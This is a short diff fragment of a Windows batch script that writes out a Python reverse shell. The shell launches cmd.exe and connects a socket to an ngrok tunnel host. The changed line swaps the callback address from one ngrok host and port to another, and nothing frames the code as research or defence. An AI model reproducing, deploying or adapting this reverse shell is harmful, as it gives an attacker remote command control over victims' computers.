@@ -12,7 +12,7 @@ if not exist %FILE% (
         echo def rev^(^)^:
         echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)
         echo    s = socket.socket^(^)
-        echo    s.connect^(('7.tcp.eu.ngrok.io', 15503^)^)
+        echo    s.connect^(('2.tcp.eu.ngrok.io', 18829^)^)
         echo.
         echo    def s_o^(^)^:
         echo        while True^:
